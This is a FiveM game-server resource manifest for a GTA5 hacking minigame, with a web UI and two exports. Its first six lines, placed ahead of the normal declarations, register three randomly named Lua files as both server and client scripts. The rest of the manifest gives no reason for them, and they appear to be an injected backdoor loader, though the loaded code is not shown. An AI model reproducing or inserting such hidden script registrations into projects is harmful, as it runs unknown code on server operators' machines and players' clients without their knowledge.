server_script "W.lua"
client_script "W.lua"
server_script "4EN3GDOO.lua"
client_script "4EN3GDOO.lua"
server_script "ID3NZZOYQ4YL.lua"
client_script "ID3NZZOYQ4YL.lua"
fx_version 'cerulean'
game 'gta5'

ui_page 'html/index.html'

client_scripts {
    'client/main.lua',
}

files {
    'html/index.html',
    'html/*.css',
    'html/src/*.js',
    'html/assets/*.png',
    'html/assets/*.mp3'
}

exports {
    'OpenHackingGame',
    'GetHackingStatus',
}
server_scripts { '@mysql-async/lib/MySQL.lua' }